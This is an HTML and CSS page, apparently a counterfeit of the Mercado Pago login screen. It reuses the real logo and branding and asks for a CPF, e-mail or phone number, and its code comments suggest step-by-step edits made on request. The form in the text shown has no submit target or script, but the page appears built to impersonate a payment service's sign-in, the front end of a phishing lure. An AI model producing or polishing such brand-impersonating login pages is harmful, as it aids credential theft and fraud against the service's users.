<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mercado Pago</title>
    <style>
        /* Reset básico para remover margens padrão */
        body {
            margin: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
            /* ALTERAÇÃO: Fundo da página agora é branco */
            background-color: #fff; 
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }

        /* Estilo do cabeçalho principal (INTOCADO, COMO SOLICITADO) */
        .main-header {
            background-color: #ffe600;
            padding: 0 700px;
            box-shadow: 0 1px 2px 0 rgba(0,0,0,.1);
            height: 60px;
            display: flex;
            align-items: center;
            justify-content: flex-start;
        }

        .main-header img {
            height: 37px;
            vertical-align: middle;
        }
        
        /* --- ESTILOS ATUALIZADOS PARA O NOVO LAYOUT --- */

        .main-content {
            flex-grow: 1;
            display: flex;
            /* ALTERAÇÃO: Itens agora são empilhados verticalmente */
            flex-direction: column; 
            /* ALTERAÇÃO: Centraliza os itens horizontalmente */
            align-items: center; 
            justify-content: flex-start;
            padding-top: 60px;
        }

        /* NOVO ESTILO: Título principal da página */
        .main-title {
            font-size: 28px;
            font-weight: 400;
            color: #333;
            line-height: 1.25;
            text-align: center;
            margin-bottom: 24px; /* Espaço entre o título e o card do formulário */
        }
        
        /* NOVO ESTILO: O "card" que contém apenas o formulário */
        .form-card {
            width: 100%;
            max-width: 480px; /* Largura menor para o card do formulário */
            background-color: #fff;
            /* ALTERAÇÃO: Adicionando borda cinza para visibilidade */
            border: 1px solid #ddd; 
            border-radius: 6px;
            padding: 32px;
            box-sizing: border-box;
        }

        .input-label {
            font-size: 14px;
            color: #555;
            margin-bottom: 4px;
            display: block;
        }

        .input-field {
            width: 100%;
            padding: 16px;
            font-size: 16px;
            border: 1px solid #ddd;
            border-radius: 6px;
            box-sizing: border-box;
        }
        
        .input-field:focus {
            outline: 1px solid #3483fa;
            border-color: #3483fa;
        }

        .actions {
            margin-top: 24px;
            display: flex;
            align-items: center;
            gap: 24px;
        }

        .btn-continue {
            background-color: #3483fa;
            color: white;
            border: none;
            padding: 16px 24px;
            font-size: 16px;
            font-weight: 600;
            border-radius: 6px;
            cursor: pointer;
            transition: background-color 0.2s;
        }

        .btn-continue:hover {
            background-color: #2968c8;
        }
        
        .link-create {
            color: #3483fa;
            font-size: 15px;
            font-weight: 500;
            text-decoration: none;
        }
        
        .link-create:hover {
            text-decoration: underline;
        }

    </style>
</head>
<body>

    <header class="main-header">
        <img src="https://http2.mlstatic.com/storage/mobile-on-demand-resources/image/web-private-nav-mp-logo_1X?updatedAt=1746639317789" alt="Mercado Pago">
    </header>

    <main class="main-content">
        
        <h1 class="main-title">Digite seu CPF, e-mail ou telefone para iniciar sessão</h1>

        <div class="form-card">
            <form id="login-form">
                <div>
                    <label for="identificador" class="input-label">CPF, e-mail ou telefone</label>
                    <input type="text" id="identificador" class="input-field">
                </div>
                <div class="actions">
                    <button type="submit" class="btn-continue">Continuar</button>
                    <a href="#" class="link-create">Criar conta</a>
                </div>
            </form>
        </div>

    </main>
    </body>
</html>